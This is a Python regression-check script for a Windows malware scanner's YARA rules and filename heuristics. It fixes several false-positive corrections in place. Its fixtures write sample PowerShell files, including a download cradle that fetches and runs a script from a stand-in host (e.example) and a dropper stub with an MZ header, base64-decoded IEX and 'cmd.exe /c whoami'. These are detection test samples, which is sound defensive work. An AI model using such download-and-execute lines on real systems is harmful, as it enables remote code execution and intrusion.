"""
Xtobe Final Guardian - detection rule regression check
------------------------------------------------------
Locks in the false-positive fixes:

  * Embedded_PE_In_Script only fires on a PE embedded inside script staging
    code. It used to fire on powershell.exe itself while missing real droppers.
  * Suspicious_PowerShell_Download requires a fetch AND an execute primitive.
    It used to fire on any file containing the substrings "iex" and "-enc",
    including this application's own EXE.
  * The random-name heuristic ignores vendor-signed Windows/Program Files
    images (59% of System32 matches the bare pattern) and needs digits.

    python scripts/rule_regression.py      exit 0 = every check passed

yara-python is required; when it is missing the YARA checks are skipped so the
script stays usable on a bare dev box.
"""
import os
import shutil
import sys
import tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "ai-core"))
import guardian  # noqa: E402  pylint: disable=wrong-import-position

RULES = os.path.join(ROOT, "ai-core", "rules.yar")
EXE = os.path.join(ROOT, "src-tauri", "target", "release", "xtobe-final-guardian.exe")
SYSTEM_ROOT = os.environ.get("SystemRoot")

MZ = bytes([0x4D, 0x5A, 0x90, 0x00])
RESULTS = []


def check(name: str, ok: bool, detail: str = "") -> None:
    """Record one assertion and echo it."""
    RESULTS.append((name, ok))
    mark = "PASS" if ok else "FAIL"
    print(f"  [{mark}] {name}" + (f" - {detail}" if detail else ""))


def skip(name: str, why: str) -> None:
    print(f"  [SKIP] {name} - {why}")


def fixtures() -> dict:
    """Write the sample files every check works from."""
    home = os.path.join(os.path.expanduser("~"), ".xtobe-rule-check")
    shutil.rmtree(home, ignore_errors=True)
    os.makedirs(home, exist_ok=True)

    dropper = (b"# stage 1 loader\r\n" + MZ + b"\x00" * 64
               + b"\r\n$raw = Convert.FromBase64String(payload)\r\nIEX $raw\r\n"
               + b"cmd.exe /c whoami\r\n")
    cradle = (b"# bootstrap\r\n"
              b"IEX (New-Object Net.WebClient).DownloadString('http://e.example/a.ps1')\r\n")
    benign = b"# maintenance runbook\r\npowershell -File cleanup.ps1\r\n"

    paths = {
        "dropper": os.path.join(home, "dropper.ps1"),
        "cradle": os.path.join(home, "cradle.ps1"),
        "benign": os.path.join(home, "benign.ps1"),
        "random_name": os.path.join(home, "a3f9c21b.exe"),
        "dict_name": os.path.join(home, "backgroundtaskhost.exe"),
        "double_ext": os.path.join(home, "invoice.pdf.exe"),
    }
    for name, body in (("dropper", dropper), ("cradle", cradle),
                       ("benign", benign), ("random_name", benign),
                       ("dict_name", benign), ("double_ext", benign)):
        with open(paths[name], "wb") as fh:
            fh.write(body)
    return paths


def main() -> int:
    paths = fixtures()

    try:
        import yara  # pylint: disable=import-outside-toplevel
    except ImportError:
        yara = None

    print("YARA rules")
    if yara is None:
        skip("ruleset", "yara-python not installed")
    else:
        rules = yara.compile(filepath=RULES)
        hits = lambda p: [m.rule for m in rules.match(p)]  # noqa: E731

        check("embedded PE in script is caught",
              "Embedded_PE_In_Script" in hits(paths["dropper"]))
        check("download cradle is caught",
              "Suspicious_PowerShell_Download" in hits(paths["cradle"]))
        check("benign script is ignored", not hits(paths["benign"]))

        if SYSTEM_ROOT and os.path.exists(
                os.path.join(SYSTEM_ROOT, "System32", "WindowsPowerShell",
                             "v1.0", "powershell.exe")):
            real = os.path.join(SYSTEM_ROOT, "System32", "WindowsPowerShell",
                                "v1.0", "powershell.exe")
            found = hits(real)
            check("signed powershell.exe is not flagged", not found, str(found))
        else:
            skip("signed powershell.exe is not flagged", "not on Windows")

        if os.path.exists(EXE):
            found = hits(EXE)
            check("this app's own EXE is not flagged", not found, str(found))
        else:
            skip("this app's own EXE is not flagged", "release binary not built")

    print("Heuristics")
    verdict = lambda p: guardian.scan_file(p)["verdict"]  # noqa: E731
    check("hash-style name outside trusted roots is suspicious",
          verdict(paths["random_name"]) == "suspicious", verdict(paths["random_name"]))
    check("dictionary-style name is clean",
          verdict(paths["dict_name"]) == "clean", verdict(paths["dict_name"]))
    check("double extension is still malicious",
          verdict(paths["double_ext"]) == "malicious", verdict(paths["double_ext"]))

    if SYSTEM_ROOT:
        vendor = os.path.join(SYSTEM_ROOT, "System32", "RuntimeBroker.exe")
        check("System32 counts as a trusted root", guardian.in_trusted_root(vendor))
        check("a user folder is not a trusted root",
              not guardian.in_trusted_root(paths["random_name"]))
    else:
        skip("trusted-root allowlist", "not on Windows")

    failed = [name for name, ok in RESULTS if not ok]
    total = len(RESULTS)
    print(f"\n  {total - len(failed)}/{total} checks passed")
    if failed:
        print("  failed: " + ", ".join(failed))
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
